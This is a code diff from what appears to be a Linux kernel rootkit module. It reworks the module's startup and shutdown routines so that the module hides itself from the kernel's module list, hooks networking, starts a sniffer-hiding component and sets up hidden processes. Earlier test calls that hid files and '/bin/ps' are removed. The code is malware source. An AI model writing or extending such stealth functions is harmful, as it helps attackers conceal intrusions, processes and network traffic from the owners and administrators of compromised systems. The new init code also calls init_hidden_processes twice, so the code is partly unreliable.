@@ -387,21 +387,19 @@ int unhide_file(const char *path_name) {
 }
 
 void MRK_exit(void) {
+	sniff_hiding_exit();
     MRK_exit_nethook();
     unhide_module();
-	printk(KERN_INFO "Goodbye, World!\n");
 }
 
 static int __init MRK_initialize(void) {
-    MRK_init_nethook();
-	MRK_init_sockets_hook();
-    init_hidden_processes();
-	hide_file(test_path_name);
-	hide_file(test_path_name2);
-	unhide_file(test_path_name2);
-    hide_process("/bin/ps");
+	int err;
+
 	hide_module();
-	printk(KERN_INFO "Hello, World!\n");
+	if ((err = MRK_init_nethook())) return err;
+	if ((err = sniff_hiding_init())) return err;
+	if ((err = init_hidden_processes())) return err;
+    init_hidden_processes();
 	return 0;
 }
 
